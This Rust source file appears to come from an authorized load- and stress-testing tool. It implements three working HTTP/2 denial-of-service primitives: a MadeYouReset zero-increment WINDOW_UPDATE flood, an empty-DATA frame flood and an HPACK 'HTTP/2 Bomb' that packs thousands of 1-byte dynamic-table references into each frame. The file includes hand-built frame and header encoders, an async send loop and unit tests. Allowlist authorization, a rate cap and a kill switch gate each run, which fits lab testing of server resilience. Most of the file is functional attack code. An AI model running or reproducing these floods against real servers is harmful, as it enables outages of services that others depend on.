//! # HTTP/2 stream-based floods (MadeYouReset / empty-DATA / HTTP/2 Bomb) —
//! isolated-lab / authorized use.
//!
//! Unlike the connection-level control-frame floods in [`crate::h2_frame_flood`]
//! (which never open a request stream), these three primitives open **real
//! request streams** and abuse the server work each one triggers. All are crafted
//! by hand on the byte stream via [`crate::h2_frames`] — std-only, no new
//! dependency — including a minimal hand-rolled **HPACK** request header block.
//!
//!   - **MadeYouReset** (CVE-2025-8671) — open a complete request stream
//!     (`HEADERS` with `END_STREAM`), then send a `WINDOW_UPDATE` with a **zero
//!     increment** on that stream. RFC 9113 §6.9 makes a zero increment a
//!     *stream* error, so the **server** emits `RST_STREAM` — the attacker never
//!     sends `RST_STREAM` itself, side-stepping Rapid-Reset (CVE-2023-44487)
//!     mitigations. Because the reset stream is no longer counted against
//!     `SETTINGS_MAX_CONCURRENT_STREAMS` yet the server may keep processing the
//!     request, the client drives unbounded backend work over one connection.
//!   - **empty-DATA flood** (CVE-2019-9518) — open a request stream that does
//!     *not* end (`HEADERS` without `END_STREAM`), then flood **empty `DATA`
//!     frames** (zero-length payload, no `END_STREAM`). The peer spends
//!     per-frame processing disproportionate to the near-zero attacker bandwidth.
//!   - **HTTP/2 Bomb** (CVE-2026-49975 / CVE-2026-47774) — HPACK **amplification**:
//!     each `HEADERS` frame inserts one 1-byte dynamic-table entry and then
//!     references it thousands of times (1 byte each), so the server materialises
//!     thousands of header entries per frame (~thousands×). The opening `SETTINGS`
//!     advertises `INITIAL_WINDOW_SIZE = 0`, so the server can never send a
//!     response body and free the stream, pinning the amplified memory.
//!
//! ## Same safety boundary as the other L7 engines
//!
//! The URL host is authorized as a **datum** ([`crate::authorize_datum`]) and
//! pinned to a single connect address; the connection only ever reaches the
//! gate-authorized target. `https` negotiates HTTP/2 via ALPN (accept-any-cert,
//! see [`crate::tls`]); `http` uses prior-knowledge h2c. The run is bounded by
//! `duration`, capped by the rate cap (reinterpreted per primitive — reset cycles
//! / empty-DATA frames / bomb frames per second), and aborts promptly on the kill
//! switch. The "amplification" is **server-side memory/CPU** from bytes the client
//! really sends from its real address — there is no spoofing and no
//! network-reflection amplification (which remain out of scope). Direct self-test.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::MissedTickBehavior;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::TlsConnector;

use jinrai_core::{Layer, ModuleError, RunPlan, RunReport, StressModule};
use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};

use crate::h2_frames::{
    push_frame, FLAG_END_HEADERS, FLAG_END_STREAM, FLAG_NONE, PREFACE, TYPE_DATA, TYPE_HEADERS,
    TYPE_SETTINGS, TYPE_WINDOW_UPDATE,
};
use crate::{authorize_datum, resolve_addrs, wait_for_kill, Datum, L7Error};

/// `SETTINGS_MAX_FRAME_SIZE` has a hard RFC floor of 16384, so a header block up
/// to this size is always accepted without a `FRAME_SIZE_ERROR`. The Bomb packs
/// its 1-byte references up to (just under) this ceiling in a single HEADERS
/// frame — the more references, the higher the decode amplification.
const MAX_FRAME_SIZE: usize = 16_384;

/// Which stream-based HTTP/2 flood to run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum H2StreamKind {
    /// MadeYouReset (CVE-2025-8671): complete request then a zero-increment
    /// `WINDOW_UPDATE` so the *server* resets the stream.
    MadeYouReset,
    /// Empty-DATA flood (CVE-2019-9518): open a stream, then flood zero-length
    /// `DATA` frames without `END_STREAM`.
    EmptyData,
    /// HTTP/2 Bomb (CVE-2026-49975): HPACK 1-byte-reference amplification with a
    /// zero initial window so the amplified memory stays pinned.
    Bomb,
}

impl H2StreamKind {
    fn label(self) -> &'static str {
        match self {
            H2StreamKind::MadeYouReset => "l7-h2-made-you-reset",
            H2StreamKind::EmptyData => "l7-h2-empty-data",
            H2StreamKind::Bomb => "l7-h2-bomb",
        }
    }

    fn unit_word(self) -> &'static str {
        match self {
            H2StreamKind::MadeYouReset => "reset cycle",
            H2StreamKind::EmptyData => "empty DATA frame",
            H2StreamKind::Bomb => "bomb frame",
        }
    }
}

/// Encode an HPACK string literal (RFC 7541 §5.2) with **no Huffman coding**:
/// a 7-bit length prefix (high bit 0 = not Huffman) then the raw bytes.
///
/// Lengths of 127 or more need the multi-byte integer form of §5.1, so encode
/// that rather than assuming the short one. A hostname may legitimately reach
/// 253 bytes, and truncating its length into 7 bits does not fail loudly — it
/// produces a header block the server parses as something else entirely, which
/// in a *test tool* means silently measuring the wrong thing.
fn hpack_str(out: &mut Vec<u8>, s: &[u8]) {
    hpack_int(out, s.len(), 7, 0x00);
    out.extend_from_slice(s);
}

/// HPACK integer representation (RFC 7541 §5.1): `value` in a field whose low
/// `prefix_bits` are available, OR-ed under `flags` (the high bits that are not
/// part of the integer). Values that fit in the prefix use one octet; larger
/// ones set the prefix to all-ones and continue in 7-bit groups with the high
/// bit marking continuation.
fn hpack_int(out: &mut Vec<u8>, value: usize, prefix_bits: u32, flags: u8) {
    let max_prefix = (1usize << prefix_bits) - 1;
    if value < max_prefix {
        out.push(flags | value as u8);
        return;
    }
    out.push(flags | max_prefix as u8);
    let mut rest = value - max_prefix;
    while rest >= 128 {
        out.push((rest % 128) as u8 | 0x80);
        rest /= 128;
    }
    out.push(rest as u8);
}

/// A minimal, valid HPACK request header block for `GET / ` against `host`:
/// `:method GET` (static index 2), `:scheme` (index 6 http / 7 https),
/// `:path /` (index 4) as single-byte indexed fields, then `:authority: <host>`
/// as a literal-with-incremental-indexing using static name index 1.
fn request_block(host: &str, https: bool) -> Vec<u8> {
    let mut b = Vec::with_capacity(5 + host.len());
    b.push(0x82); // :method GET
    b.push(if https { 0x87 } else { 0x86 }); // :scheme https / http
    b.push(0x84); // :path /
    b.push(0x41); // literal, incremental indexing, name index 1 (:authority)
    hpack_str(&mut b, host.as_bytes());
    b
}

/// The Bomb header block: a valid request, then one dynamic-table insert of a
/// 1-byte name with empty value (lands at dynamic index 62), then as many 1-byte
/// references to that entry as fit under [`MAX_FRAME_SIZE`]. The server must
/// decode every reference into a full header entry — the amplification.
fn bomb_block(host: &str, https: bool) -> Vec<u8> {
    let mut b = request_block(host, https);
    // Literal with incremental indexing, NEW name (0x40): name "a", value "".
    b.push(0x40);
    hpack_str(&mut b, b"a");
    hpack_str(&mut b, b""); // empty value
    // Fill the rest of the frame with references to the just-inserted entry.
    // 0xBE = indexed header field, index 62 (0x80 | 62) = the dynamic entry.
    let refs = MAX_FRAME_SIZE.saturating_sub(b.len());
    b.resize(b.len() + refs, 0xBE);
    b
}

/// A SETTINGS payload advertising `SETTINGS_INITIAL_WINDOW_SIZE = 0` (id 0x4):
/// the server may never send response DATA, so a processed request's buffers stay
/// pinned. One 6-octet parameter (2-byte id + 4-byte value).
fn settings_initial_window_zero() -> [u8; 6] {
    [0x00, 0x04, 0x00, 0x00, 0x00, 0x00]
}

/// The HTTP/2 stream-flood engine. Holds a clone of the gate (the sole
/// authority), the target URL, and which stream-based flood to run.
#[derive(Debug, Clone)]
pub struct H2StreamFloodEngine {
    gate: Authorization,
    url: String,
    kind: H2StreamKind,
}

impl H2StreamFloodEngine {
    pub fn new(gate: Authorization, url: impl Into<String>, kind: H2StreamKind) -> Self {
        Self { gate, url: url.into(), kind }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    pub fn authorize_target(&self) -> Result<Vec<AuthorizedTarget>, L7Error> {
        Ok(vec![authorize_datum(&self.gate, &self.url)?.target])
    }

    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        let addr = resolve_addrs(&datum)?.primary();
        let https = datum.url.scheme() == "https";
        let host = authority(&datum);
        // https => TLS with ALPN "h2"; http => prior-knowledge h2c (no TLS).
        let tls = if https {
            let connector = TlsConnector::from(crate::tls::client_config(vec![b"h2".to_vec()])?);
            Some((connector, crate::tls::server_name(&datum)?))
        } else {
            None
        };
        Ok(Prepared { addr, https, host, tls })
    }

    /// This primitive could not start. See [`crate::module_error`] for why the
    /// distinction between a refusal and a setup failure is kept.
    fn refusal(&self, e: L7Error) -> ModuleError {
        crate::module_error(format!("L7 {}", self.kind.label()), e)
    }
}

/// The `:authority` value for a datum: host, plus `:port` when the URL carried an
/// explicit non-default port (so the request line matches what the server routes).
fn authority(datum: &Datum) -> String {
    match datum.url.port() {
        Some(p) => format!("{}:{}", datum.host, p),
        None => datum.host.clone(),
    }
}

struct Prepared {
    addr: SocketAddr,
    https: bool,
    host: String,
    tls: Option<(TlsConnector, ServerName<'static>)>,
}

impl StressModule for H2StreamFloodEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        self.kind.label()
    }

    fn execute(&mut self, plan: &RunPlan) -> Result<RunReport, ModuleError> {
        let Prepared { addr, https, host, tls } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return Err(self.refusal(e)),
        };

        // Rate cap: min spacing between units. `None` => send nothing.
        let Some(interval) = plan.rate_cap.min_interval() else {
            return Ok(RunReport {
                layer_label: format!("L7 {} {} (rate cap 0 — sent nothing)", self.kind.label(), self.url),
                aborted_early: false,
                ..Default::default()
            });
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return Err(self.refusal(L7Error::Client(e.to_string()))),
        };

        let sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let sent_w = sent.clone();
        let errors_w = errors.clone();
        let kill = plan.kill.clone();
        let duration = plan.duration;
        let kind = self.kind;
        let plan_bits = FloodBits::build(kind, &host, https);

        rt.block_on(async move {
            let deadline = crate::deadline_in(duration);
            let tcp = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr)).await {
                Ok(Ok(s)) => s,
                _ => {
                    errors_w.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            match tls {
                None => drive(tcp, kind, plan_bits, interval, deadline, kill, sent_w, errors_w).await,
                Some((connector, server_name)) => {
                    let handshake =
                        tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp));
                    let stream = match handshake.await {
                        Ok(Ok(s)) => s,
                        _ => {
                            errors_w.fetch_add(1, Ordering::Relaxed);
                            return;
                        }
                    };
                    // The server must have agreed to HTTP/2 over ALPN, else there
                    // is no h2 framing to flood.
                    if stream.get_ref().1.alpn_protocol() != Some(b"h2") {
                        errors_w.fetch_add(1, Ordering::Relaxed);
                        return;
                    }
                    drive(stream, kind, plan_bits, interval, deadline, kill, sent_w, errors_w).await;
                }
            }
        });

        let aborted = plan.kill.is_tripped();
        let n = sent.load(Ordering::Relaxed);
        Ok(RunReport {
            layer_label: format!(
                "L7 {} {} ({} {}{})",
                self.kind.label(),
                self.url,
                n,
                self.kind.unit_word(),
                if n == 1 { "" } else { "s" }
            ),
            units_sent: n,
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        })
    }
}

/// Pre-built byte material for a run: the connection-opening bytes and the header
/// block reused every tick. Computed once, before any I/O.
struct FloodBits {
    /// preface + SETTINGS (+ the initial HEADERS for empty-DATA).
    open: Vec<u8>,
    /// The per-request header block (request block, or the amplified bomb block).
    block: Vec<u8>,
}

impl FloodBits {
    fn build(kind: H2StreamKind, host: &str, https: bool) -> Self {
        let mut open = Vec::with_capacity(PREFACE.len() + 32);
        open.extend_from_slice(PREFACE);
        match kind {
            // Bomb: advertise a zero initial window so responses can never flush.
            H2StreamKind::Bomb => {
                push_frame(&mut open, TYPE_SETTINGS, FLAG_NONE, 0, &settings_initial_window_zero())
            }
            _ => push_frame(&mut open, TYPE_SETTINGS, FLAG_NONE, 0, &[]),
        }
        let block = match kind {
            H2StreamKind::Bomb => bomb_block(host, https),
            _ => request_block(host, https),
        };
        // Empty-DATA opens ONE stream up front (HEADERS without END_STREAM, so the
        // stream stays open to receive the flood of DATA frames), then never
        // touches HEADERS again.
        if kind == H2StreamKind::EmptyData {
            push_frame(&mut open, TYPE_HEADERS, FLAG_END_HEADERS, 1, &block);
        }
        FloodBits { open, block }
    }
}

/// One tick's bytes for `kind`, given the next client stream id (`sid`, odd,
/// advanced by the caller for the per-stream primitives).
fn tick_frame(kind: H2StreamKind, sid: u32, block: &[u8]) -> Vec<u8> {
    match kind {
        // Complete request (END_STREAM|END_HEADERS) then a zero-increment
        // WINDOW_UPDATE on the same stream => the server resets it.
        H2StreamKind::MadeYouReset => {
            let mut f = Vec::with_capacity(9 + block.len() + 9 + 4);
            push_frame(&mut f, TYPE_HEADERS, FLAG_END_STREAM | FLAG_END_HEADERS, sid, block);
            push_frame(&mut f, TYPE_WINDOW_UPDATE, FLAG_NONE, sid, &0u32.to_be_bytes());
            f
        }
        // A zero-length DATA frame (no END_STREAM) on the already-open stream 1.
        H2StreamKind::EmptyData => {
            let mut f = Vec::with_capacity(9);
            push_frame(&mut f, TYPE_DATA, FLAG_NONE, 1, &[]);
            f
        }
        // A complete request carrying the amplified header block on a new stream.
        H2StreamKind::Bomb => {
            let mut f = Vec::with_capacity(9 + block.len());
            push_frame(&mut f, TYPE_HEADERS, FLAG_END_STREAM | FLAG_END_HEADERS, sid, block);
            f
        }
    }
}

/// Open the connection at the frame level, then write one unit per tick until the
/// deadline or kill. Generic over the byte stream so the same loop serves h2c
/// (`TcpStream`) and h2-over-TLS (`TlsStream`).
#[allow(clippy::too_many_arguments)]
async fn drive<IO>(
    mut io: IO,
    kind: H2StreamKind,
    bits: FloodBits,
    interval: Duration,
    deadline: Instant,
    kill: KillSwitch,
    sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) where
    IO: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    if io.write_all(&bits.open).await.is_err() {
        errors.fetch_add(1, Ordering::Relaxed);
        return;
    }

    let mut ticker = tokio::time::interval(interval);
    // Never exceed the cap: on a missed tick, delay rather than burst.
    ticker.set_missed_tick_behavior(MissedTickBehavior::Delay);
    // Client streams are odd, starting at 1. (Empty-DATA reuses stream 1, opened
    // in `bits.open`, so it ignores this counter.)
    let mut sid: u32 = 1;

    loop {
        tokio::select! {
            _ = ticker.tick() => {}
            _ = wait_for_kill(kill.clone()) => break,
        }
        if kill.is_tripped() || Instant::now() >= deadline {
            break;
        }

        let frame = tick_frame(kind, sid, &bits.block);
        if kind != H2StreamKind::EmptyData {
            sid = sid.wrapping_add(2);
        }

        // A write failure means the peer tore the connection down (e.g. it bounds
        // resets / header memory and closed) or stopped reading — record and stop.
        // The write is raced against the kill switch and the deadline: these
        // primitives aim to exhaust the server, so a peer that stops draining is
        // the expected outcome, not an edge case.
        match crate::write_or_stop(&mut io, &frame, &kill, deadline).await {
            crate::FrameWrite::Wrote => {
                sent.fetch_add(1, Ordering::Relaxed);
            }
            crate::FrameWrite::Failed => {
                errors.fetch_add(1, Ordering::Relaxed);
                break;
            }
            crate::FrameWrite::Stopped => break,
        }
    }

    let _ = io.shutdown().await;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use std::net::TcpListener;
    use std::sync::atomic::AtomicBool;
    use std::sync::Mutex;
    use std::thread;

    use jinrai_core::RateCap;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    #[test]
    fn authorizes_http_and_https_datums() {
        for url in ["http://127.0.0.1:9/", "https://127.0.0.1:9/"] {
            let engine = H2StreamFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), url, H2StreamKind::MadeYouReset);
            assert!(engine.authorize_target().is_ok(), "{url} should authorize");
        }
    }

    #[test]
    fn unauthorized_target_refused() {
        let engine =
            H2StreamFloodEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/", H2StreamKind::EmptyData);
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn names_reflect_the_kind() {
        for (kind, want) in [
            (H2StreamKind::MadeYouReset, "l7-h2-made-you-reset"),
            (H2StreamKind::EmptyData, "l7-h2-empty-data"),
            (H2StreamKind::Bomb, "l7-h2-bomb"),
        ] {
            let engine = H2StreamFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", kind);
            assert_eq!(engine.name(), want);
            assert_eq!(engine.layer(), Layer::L7);
        }
    }

    #[test]
    fn request_block_is_minimal_valid_hpack() {
        // GET / against "h": :method(0x82) :scheme-http(0x86) :path(0x84)
        // :authority literal name-index-1 (0x41) len 1 'h'.
        let b = request_block("h", false);
        assert_eq!(b, vec![0x82, 0x86, 0x84, 0x41, 0x01, b'h']);
        // https flips the scheme byte to index 7.
        assert_eq!(request_block("h", true)[1], 0x87);
    }

    #[test]
    fn bomb_block_amplifies_with_1byte_references() {
        let b = bomb_block("example.com", false);
        // Fills (just under) a max-size frame — thousands of references.
        assert!(b.len() > MAX_FRAME_SIZE - 8 && b.len() <= MAX_FRAME_SIZE, "len {}", b.len());
        // Contains the dynamic insert (0x40) and a long run of 0xBE references.
        assert!(b.contains(&0x40), "must insert a dynamic entry");
        let refs = b.iter().filter(|&&x| x == 0xBE).count();
        assert!(refs > 10_000, "should reference the entry thousands of times: {refs}");
    }

    /// RFC 7541 §5.1: a length of 127 or more does not fit the 7-bit prefix and
    /// must continue into further octets. A hostname can be 253 bytes, so the
    /// short form is not always available — and getting this wrong corrupts the
    /// header block silently rather than failing.
    #[test]
    fn hpack_encodes_string_lengths_that_do_not_fit_the_prefix() {
        // Below the boundary: one octet holding the length itself.
        let mut short = Vec::new();
        hpack_str(&mut short, &b"x".repeat(126));
        assert_eq!(short[0], 126, "126 still fits the 7-bit prefix");
        assert_eq!(short.len(), 1 + 126);

        // At and above it: prefix saturates to 127, remainder in 7-bit groups.
        let mut at = Vec::new();
        hpack_str(&mut at, &b"x".repeat(127));
        assert_eq!(&at[..2], &[127, 0], "127 => prefix 127, then a zero remainder");
        assert_eq!(at.len(), 2 + 127);

        let mut long = Vec::new();
        hpack_str(&mut long, &b"x".repeat(253));
        // 253 - 127 = 126, which fits one continuation octet with no high bit.
        assert_eq!(&long[..2], &[127, 126]);
        assert_eq!(long.len(), 2 + 253, "the host must survive the encoding intact");

        // A realistic long authority round-trips into the block at full length.
        let host = format!("{}.staging.internal", "a".repeat(200));
        let block = request_block(&host, false);
        assert!(
            block.windows(host.len()).any(|w| w == host.as_bytes()),
            "the full authority must appear in the header block"
        );
    }

    #[test]
    fn made_you_reset_tick_is_headers_then_zero_window_update() {
        let block = request_block("h", false);
        let f = tick_frame(H2StreamKind::MadeYouReset, 3, &block);
        // First frame: HEADERS on stream 3 with END_STREAM|END_HEADERS (0x5).
        assert_eq!(f[3], TYPE_HEADERS);
        assert_eq!(f[4], FLAG_END_STREAM | FLAG_END_HEADERS);
        assert_eq!(&f[5..9], &[0, 0, 0, 3]);
        // Second frame starts after 9 + block.len(): WINDOW_UPDATE, stream 3, incr 0.
        let wu = &f[9 + block.len()..];
        assert_eq!(wu[3], TYPE_WINDOW_UPDATE);
        assert_eq!(&wu[5..9], &[0, 0, 0, 3], "on the same stream, not stream 0");
        assert_eq!(&wu[9..13], &[0, 0, 0, 0], "zero increment => server-side stream reset");
    }

    #[test]
    fn empty_data_tick_is_zero_length_data_on_stream_1() {
        let f = tick_frame(H2StreamKind::EmptyData, 999, &[]);
        assert_eq!(&f[0..3], &[0, 0, 0], "zero-length DATA payload");
        assert_eq!(f[3], TYPE_DATA);
        assert_eq!(f[4], FLAG_NONE, "no END_STREAM: the stream stays open");
        assert_eq!(&f[5..9], &[0, 0, 0, 1], "always the opened stream 1");
    }

    #[test]
    fn rate_cap_zero_sends_nothing() {
        let mut engine =
            H2StreamFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2StreamKind::Bomb);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(0),
            duration: Duration::from_millis(50),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        assert_eq!(report.units_sent, 0);
        assert!(!report.aborted_early);
        assert!(report.layer_label.contains("sent nothing"));
    }

    #[allow(clippy::type_complexity)]
    fn spawn_raw_server() -> (u16, Arc<Mutex<Vec<u8>>>, Arc<AtomicBool>, thread::JoinHandle<()>) {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let seen = Arc::new(Mutex::new(Vec::<u8>::new()));
        let stop = Arc::new(AtomicBool::new(false));
        let seen_s = seen.clone();
        let stop_s = stop.clone();
        let handle = thread::spawn(move || {
            while !stop_s.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut s, _)) => {
                        s.set_read_timeout(Some(Duration::from_millis(100))).unwrap();
                        let mut buf = [0u8; 65536];
                        while !stop_s.load(Ordering::Relaxed) {
                            match s.read(&mut buf) {
                                Ok(0) => break,
                                Ok(n) => seen_s.lock().unwrap().extend_from_slice(&buf[..n]),
                                Err(ref e)
                                    if e.kind() == std::io::ErrorKind::WouldBlock
                                        || e.kind() == std::io::ErrorKind::TimedOut => {}
                                Err(_) => break,
                            }
                        }
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });
        (port, seen, stop, handle)
    }

    /// Walk the frame stream (after the preface) and report whether any frame has
    /// the given type byte.
    fn has_frame_of_type(bytes: &[u8], ty: u8) -> bool {
        let Some(mut rest) = bytes.strip_prefix(PREFACE) else { return false };
        while rest.len() >= 9 {
            let len = ((rest[0] as usize) << 16) | ((rest[1] as usize) << 8) | rest[2] as usize;
            if rest[3] == ty {
                return true;
            }
            let frame_end = 9 + len;
            if rest.len() < frame_end {
                break;
            }
            rest = &rest[frame_end..];
        }
        false
    }

    #[test]
    fn made_you_reset_sends_preface_headers_and_window_update() {
        let (port, seen, stop, handle) = spawn_raw_server();
        let url = format!("http://127.0.0.1:{port}/");
        let mut engine = H2StreamFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url, H2StreamKind::MadeYouReset);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(200),
            duration: Duration::from_millis(400),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        thread::sleep(Duration::from_millis(100));
        stop.store(true, Ordering::Relaxed);
        handle.join().unwrap();

        assert!(report.units_sent > 0, "should have sent reset cycles");
        let bytes: Vec<u8> = { seen.lock().unwrap().clone() };
        assert!(bytes.starts_with(PREFACE), "connection must open with the h2 preface");
        assert!(has_frame_of_type(&bytes, TYPE_HEADERS), "server should have seen a HEADERS frame");
        assert!(has_frame_of_type(&bytes, TYPE_WINDOW_UPDATE), "and a WINDOW_UPDATE frame");
    }

    #[test]
    fn empty_data_opens_a_stream_then_floods_data() {
        let (port, seen, stop, handle) = spawn_raw_server();
        let url = format!("http://127.0.0.1:{port}/");
        let mut engine = H2StreamFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url, H2StreamKind::EmptyData);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(200),
            duration: Duration::from_millis(400),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        thread::sleep(Duration::from_millis(100));
        stop.store(true, Ordering::Relaxed);
        handle.join().unwrap();

        assert!(report.units_sent > 0, "should have sent empty DATA frames");
        let bytes: Vec<u8> = { seen.lock().unwrap().clone() };
        assert!(bytes.starts_with(PREFACE));
        assert!(has_frame_of_type(&bytes, TYPE_HEADERS), "opens a stream with HEADERS");
        assert!(has_frame_of_type(&bytes, TYPE_DATA), "then floods DATA frames");
    }
}
